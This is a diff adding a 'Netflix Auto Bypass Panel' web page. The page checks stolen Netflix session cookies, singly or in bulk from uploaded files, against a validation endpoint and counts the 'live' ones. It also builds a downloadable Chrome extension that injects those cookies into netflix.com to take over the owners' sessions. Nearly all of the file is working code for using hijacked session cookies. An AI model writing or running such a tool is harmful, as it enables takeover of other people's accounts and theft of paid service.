@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>NETFLIX AUTO BYPASS — AFTAB</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Share Tech Mono', monospace; }
+  body { background:#000; color:#39ff14; display:flex; justify-content:center; align-items:center; min-height:100vh; padding:20px; }
+  .container { background:#0a0a0a; border:3px solid #39ff14; border-radius:30px; padding:30px 20px; width:100%; max-width:440px; box-shadow:0 0 20px #39ff14, inset 0 0 20px rgba(57,255,20,0.2); text-align:center; }
+  .header { font-size:24px; font-weight:bold; line-height:1.2; margin-bottom:20px; text-shadow:0 0 10px #39ff14; }
+  .header span { display:block; font-size:16px; margin-top:5px; }
+  .badge { background:#39ff14; color:#000; padding:3px 12px; border-radius:20px; font-size:12px; font-weight:bold; display:inline-block; margin-top:5px; box-shadow:0 0 10px #39ff14; }
+  .status-line { font-size:12px; margin:15px 0; }
+  .dot { color:#39ff14; font-size:18px; animation:blink 1s infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  .sub-status { font-size:11px; border-bottom:1px solid #39ff14; padding-bottom:10px; margin-bottom:20px; }
+  .section-title { font-size:14px; font-weight:bold; color:#ffcc00; margin-bottom:10px; text-align:left; border-left:4px solid #ffcc00; padding-left:8px; }
+  .checker-box { border:2px solid #ffcc00; border-radius:15px; padding:15px; margin-bottom:20px; background:rgba(255,204,0,0.05); }
+  .checker-box textarea { width:100%; height:80px; background:#000; border:1px solid #39ff14; border-radius:10px; color:#39ff14; padding:10px; font-size:12px; resize:none; outline:none; font-family:'Share Tech Mono', monospace; }
+  .checker-box textarea::placeholder { color:rgba(57,255,20,0.4); }
+  .check-btn { background:#ffcc00; color:#000; border:none; border-radius:12px; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; margin-top:10px; box-shadow:0 0 10px #ffcc00; }
+  .check-btn:hover { transform:scale(1.02); box-shadow:0 0 20px #ffcc00; }
+  .check-result { margin-top:10px; font-size:13px; font-weight:bold; padding:8px; border-radius:10px; display:none; }
+  .check-result.valid { display:block; background:rgba(57,255,20,0.15); border:1px solid #39ff14; color:#39ff14; }
+  .check-result.invalid { display:block; background:rgba(255,0,0,0.15); border:1px solid #ff0000; color:#ff0000; }
+  .upload-btn-wrapper { position:relative; overflow:hidden; display:inline-block; width:100%; margin-bottom:15px; }
+  .upload-btn { border:2px dashed #39ff14; color:#39ff14; background:transparent; padding:12px 20px; border-radius:15px; font-size:13px; font-weight:bold; width:100%; cursor:pointer; }
+  .upload-btn:hover { background-color:rgba(57,255,20,0.1); box-shadow:0 0 15px #39ff14; }
+  .upload-btn-wrapper input[type=file] { position:absolute; left:0; top:0; opacity:0; cursor:pointer; height:100%; width:100%; }
+  .validity-box { margin-bottom:15px; font-size:12px; padding:8px; border-radius:10px; display:none; }
+  .validity-box.valid { display:block; background:rgba(57,255,20,0.1); border:1px solid #39ff14; color:#39ff14; }
+  .validity-box.invalid { display:block; background:rgba(255,0,0,0.1); border:1px solid #ff0000; color:#ff0000; }
+  .platforms { display:flex; justify-content:center; gap:10px; margin-bottom:20px; }
+  .platform-btn { border:2px solid #39ff14; border-radius:15px; padding:12px 8px; width:80px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:5px; cursor:pointer; background:transparent; color:#39ff14; font-size:10px; font-weight:bold; }
+  .platform-btn.active { background:#39ff14; color:#000; box-shadow:0 0 15px #39ff14; }
+  .platform-btn svg { width:20px; height:20px; fill:currentColor; }
+  .generate-btn { background:#39ff14; color:#000; border:none; border-radius:50px; padding:16px; width:100%; font-size:16px; font-weight:bold; cursor:pointer; box-shadow:0 0 20px #39ff14; }
+  .generate-btn:hover { transform:scale(1.02); }
+  .action-buttons { display:none; flex-direction:column; gap:10px; margin-top:15px; }
+  .action-btn { padding:14px; border-radius:15px; border:none; font-weight:bold; cursor:pointer; font-size:13px; text-decoration:none; text-align:center; }
+  .action-btn.bypass-btn { background:#ff0044; color:#fff; box-shadow:0 0 15px #ff0044; animation:pulseBypass 1.5s infinite; }
+  .action-btn.dl-btn { background:#00c8ff; color:#000; box-shadow:0 0 15px #00c8ff; }
+  @keyframes pulseBypass { 0%{box-shadow:0 0 10px #ff0044} 50%{box-shadow:0 0 25px #ff0044, 0 0 40px #ff0044} 100%{box-shadow:0 0 10px #ff0044} }
+  .cookie-box { border:2px solid #39ff14; border-radius:20px; padding:12px; margin-bottom:15px; font-size:13px; }
+  .cookie-count { color:#ffcc00; font-weight:bold; }
+  .token-display { margin-top:15px; font-size:12px; word-break:break-all; border:1px dashed #39ff14; padding:10px; border-radius:10px; display:none; background:rgba(57,255,20,0.05); color:#fff; }
+  .footer { margin-top:25px; font-size:11px; color:#39ff14; display:flex; flex-direction:column; gap:8px; align-items:center; }
+  .made-by { font-size:13px; font-weight:bold; color:#000; background:#39ff14; padding:6px 15px; border-radius:20px; box-shadow:0 0 15px #39ff14; text-transform:uppercase; letter-spacing:2px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">⚡ NETFLIX AUTO<br>BYPASS PANEL<span>WEB <span class="badge">AFTAB</span></span></div>
+
+  <div class="status-line"><span class="dot">●</span> CORE: BYPASS // <span id="clock">00:00:00</span></div>
+  <div class="sub-status">&gt;_ AUTO-INJECT • 4K • ALL DEVICES</div>
+
+  <div class="checker-box">
+    <div class="section-title">🔍 SINGLE COOKIE CHECKER</div>
+    <textarea id="singleCookieInput" placeholder="paste netflix cookie...&#10;NetflixId=...; SecureNetflixId=..."></textarea>
+    <button class="check-btn" onclick="checkSingleCookie()">🔎 CHECK COOKIE</button>
+    <div class="check-result" id="singleCheckResult"></div>
+  </div>
+
+  <div class="cookie-box">
+    <div>💀 ACTIVE PREMIUM COOKIES: <span class="cookie-count" id="cookieCount">0</span> |</div>
+    <div style="color:#39ff14; font-weight:bold;" id="cookieStatus">READY TO BREACH</div>
+  </div>
+
+  <div class="upload-btn-wrapper">
+    <button class="upload-btn">📁 UPLOAD COOKIE FILE (.txt)</button>
+    <input type="file" id="cookieFileInput" accept=".txt,.json" onchange="handleFileUpload(event)" />
+  </div>
+
+  <div class="validity-box" id="validityBox"></div>
+
+  <div class="platforms">
+    <button class="platform-btn active" data-p="mobile" onclick="selectPlatform(this)">
+      <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>MOBILE</button>
+    <button class="platform-btn" data-p="pc" onclick="selectPlatform(this)">
+      <svg viewBox="0 0 24 24"><path d="M21 2H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7v2H8v2h8v-2h-2v-2h7c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H3V4h18v12z"/></svg>PC</button>
+    <button class="platform-btn" data-p="tv" onclick="selectPlatform(this)">
+      <svg viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/></svg>4K TV</button>
+  </div>
+
+  <button class="generate-btn" onclick="generateToken()">⚡ GENERATE TOKEN</button>
+
+  <div class="action-buttons" id="actionButtons">
+    <button class="action-btn dl-btn" onclick="downloadExtension()">📦 DOWNLOAD BYPASS EXTENSION</button>
+    <button class="action-btn bypass-btn" onclick="bypassAndOpen()">🚀 BYPASS &amp; OPEN NETFLIX</button>
+  </div>
+
+  <div class="token-display" id="tokenDisplay"></div>
+
+  <div class="footer">
+    <div class="made-by">👑 Made by Aftab 👑</div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script>
+let selectedPlatform = 'mobile';
+let lastValidCookie = '';
+
+function updateClock() {
+  document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', { hour12:false });
+}
+setInterval(updateClock, 1000); updateClock();
+
+function selectPlatform(btn) {
+  document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  selectedPlatform = btn.dataset.p;
+}
+
+function playBeep(freq) {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = ctx.createOscillator();
+    o.type = 'sine';
+    o.frequency.setValueAtTime(freq, ctx.currentTime);
+    o.connect(ctx.destination);
+    o.start(); o.stop(ctx.currentTime + 0.1);
+  } catch(e){}
+}
+
+function extractCookies(raw) {
+  const parts = raw.split(/[;\n]/).map(x => x.trim()).filter(Boolean);
+  const keep = ['netflixid','securenetflixid','nfvdid','netflixuserid'];
+  const out = [];
+  for (const p of parts) {
+    const eq = p.indexOf('=');
+    if (eq < 0) continue;
+    const k = p.slice(0, eq).trim().toLowerCase();
+    const v = p.slice(eq + 1).trim();
+    if (keep.includes(k) && v) out.push(p);
+  }
+  return out.join('; ');
+}
+
+async function checkSingleCookie() {
+  const input = document.getElementById('singleCookieInput').value.trim();
+  const resultBox = document.getElementById('singleCheckResult');
+  if (!input) {
+    resultBox.className = 'check-result invalid';
+    resultBox.innerHTML = '❌ ENTER A COOKIE';
+    return;
+  }
+  const normalized = extractCookies(input);
+  if (!normalized) {
+    resultBox.className = 'check-result invalid';
+    resultBox.innerHTML = '❌ NO NETFLIX COOKIE KEYS FOUND';
+    playBeep(300);
+    return;
+  }
+  resultBox.className = 'check-result';
+  resultBox.style.display = 'block';
+  resultBox.style.background = 'rgba(255,204,0,0.1)';
+  resultBox.style.border = '1px solid #ffcc00';
+  resultBox.style.color = '#ffcc00';
+  resultBox.textContent = '⏳ checking on netflix server...';
+
+  try {
+    const res = await fetch('/api/validate', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie: normalized, device: selectedPlatform })
+    });
+    const data = await res.json();
+    if (data.ok) {
+      lastValidCookie = normalized;
+      resultBox.className = 'check-result valid';
+      resultBox.innerHTML = '✅ LIVE COOKIE<br><span style="font-size:11px;">profile: ' + (data.profile || 'unknown') + '</span>';
+      document.getElementById('actionButtons').style.display = 'flex';
+      document.getElementById('cookieCount').textContent = '1';
+      document.getElementById('cookieStatus').textContent = 'LIVE — READY TO BREACH';
+      playBeep(900);
+    } else {
+      resultBox.className = 'check-result invalid';
+      resultBox.innerHTML = '❌ DEAD — ' + (data.error || 'rejected');
+      playBeep(300);
+    }
+  } catch (e) {
+    resultBox.className = 'check-result invalid';
+    resultBox.textContent = '❌ request failed: ' + e.message;
+  }
+}
+
+function handleFileUpload(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = async function(e) {
+    const lines = e.target.result.split('\n').map(x => x.trim()).filter(Boolean);
+    const validityBox = document.getElementById('validityBox');
+    validityBox.className = 'validity-box';
+    validityBox.style.display = 'block';
+    validityBox.style.background = 'rgba(255,204,0,0.1)';
+    validityBox.style.border = '1px solid #ffcc00';
+    validityBox.style.color = '#ffcc00';
+    validityBox.textContent = '⏳ checking ' + lines.length + ' cookies...';
+
+    let valid = 0;
+    for (let i = 0; i < lines.length; i++) {
+      const norm = extractCookies(lines[i]);
+      if (!norm) continue;
+      try {
+        const res = await fetch('/api/validate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookie: norm, device: selectedPlatform })
+        });
+        const data = await res.json();
+        if (data.ok) valid++;
+      } catch (err) {}
+    }
+    document.getElementById('cookieCount').textContent = valid;
+    document.getElementById('cookieStatus').textContent = 'DONE — ' + valid + '/' + lines.length + ' live';
+    if (valid > 0) {
+      validityBox.className = 'validity-box valid';
+      validityBox.innerHTML = '✅ ' + valid + ' LIVE COOKIE(S) FOUND';
+      document.getElementById('actionButtons').style.display = 'flex';
+    } else {
+      validityBox.className = 'validity-box invalid';
+      validityBox.innerHTML = '❌ 0 LIVE COOKIES';
+    }
+  };
+  reader.readAsText(file);
+}
+
+function generateToken() {
+  const td = document.getElementById('tokenDisplay');
+  const count = parseInt(document.getElementById('cookieCount').textContent);
+  if (!count) { alert('pehle valid cookie check karo'); return; }
+  td.style.display = 'block';
+  td.innerHTML = '⏳ building session token...';
+  setTimeout(() => {
+    const token = 'NF-' + btoa(lastValidCookie).replace(/=/g,'').slice(0, 32);
+    td.innerHTML = '<strong>🔑 SESSION TOKEN:</strong><br><br><span style="color:#39ff14;">' + token + '</span><br><br><span style="color:#ffcc00;">use BYPASS button</span>';
+    playBeep(800);
+  }, 800);
+}
+
+function downloadExtension() {
+  const manifest = {
+    manifest_version: 3,
+    name: 'NF Cookie Injector by Aftab',
+    version: '1.0',
+    description: 'inject netflix cookies and open session',
+    permissions: ['cookies', 'storage', 'tabs', 'scripting'],
+    host_permissions: ['https://*.netflix.com/*'],
+    action: { default_popup: 'popup.html' },
+    background: { service_worker: 'background.js' },
+    icons: {}
+  };
+
+  const popupHtml = `<!doctype html>
+<html><head><meta charset="utf-8"><style>
+body{width:300px;background:#000;color:#39ff14;font-family:monospace;padding:12px;border:2px solid #39ff14;margin:0}
+h3{margin:0 0 10px 0;font-size:14px}
+textarea{width:100%;height:110px;background:#000;color:#39ff14;border:1px solid #39ff14;padding:6px;font-size:11px;resize:none}
+button{background:#39ff14;color:#000;border:none;padding:10px;font-weight:bold;cursor:pointer;width:100%;margin-top:8px;font-family:monospace}
+button:hover{background:#ff0044;color:#fff}
+.status{margin-top:8px;font-size:11px;color:#ffcc00}
+</style></head><body>
+<h3>👑 NF Cookie Injector — Aftab</h3>
+<textarea id="c" placeholder="NetflixId=...; SecureNetflixId=..."></textarea>
+<button id="go">🚀 INJECT &amp; LOGIN</button>
+<div class="status" id="s"></div>
+<script src="popup.js"></script>
+</body></html>`;
+
+  const popupJs = `document.getElementById('go').onclick = async () => {
+  const raw = document.getElementById('c').value.trim();
+  const s = document.getElementById('s');
+  if (!raw) { s.textContent = 'no cookie'; return; }
+  s.textContent = 'injecting...';
+  const parts = raw.split(/[;\\n]/).map(x => x.trim()).filter(Boolean);
+  let ok = 0;
+  for (const p of parts) {
+    const eq = p.indexOf('=');
+    if (eq < 0) continue;
+    const name = p.slice(0, eq).trim();
+    const value = p.slice(eq + 1).trim();
+    if (!name || !value) continue;
+    try {
+      await chrome.cookies.set({
+        url: 'https://www.netflix.com/',
+        name, value,
+        domain: '.netflix.com',
+        path: '/',
+        secure: true,
+        sameSite: 'no_restriction',
+        expirationDate: Math.floor(Date.now()/1000) + 60*60*24*7
+      });
+      ok++;
+    } catch(e) { console.log(e); }
+  }
+  s.textContent = ok + ' cookies set. opening netflix...';
+  setTimeout(() => {
+    chrome.tabs.create({ url: 'https://www.netflix.com/browse' });
+    window.close();
+  }, 600);
+};`;
+
+  const backgroundJs = `chrome.runtime.onInstalled.addListener(() => {
+  console.log('NF Cookie Injector by Aftab loaded');
+});`;
+
+  const zip = new JSZip();
+  zip.file('manifest.json', JSON.stringify(manifest, null, 2));
+  zip.file('popup.html', popupHtml);
+  zip.file('popup.js', popupJs);
+  zip.file('background.js', backgroundJs);
+  zip.generateAsync({ type: 'blob' }).then(blob => {
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'nf-injector-aftab.zip';
+    a.click();
+  });
+}
+
+function bypassAndOpen() {
+  if (!lastValidCookie) { alert('pehle valid cookie check karo'); return; }
+  const td = document.getElementById('tokenDisplay');
+  td.style.display = 'block';
+  td.innerHTML = '🚀 preparing injection...<br><span style="font-size:11px;">downloading extension + cookie auto-fill</span>';
+  downloadExtension();
+  navigator.clipboard.writeText(lastValidCookie).then(() => {
+    setTimeout(() => {
+      td.innerHTML = '🔓 cookie copied to clipboard!<br><span style="font-size:11px;">1. load the extension<br>2. open popup → paste → inject</span><br><br><code style="font-size:10px;word-break:break-all;">' + lastValidCookie + '</code>';
+      playBeep(900);
+    }, 800);
+  }).catch(() => {
+    td.innerHTML = '🔓 cookie ready<br><br><code style="font-size:10px;word-break:break-all;">' + lastValidCookie + '</code>';
+  });
+}
+</script>
+</body>
+</html>
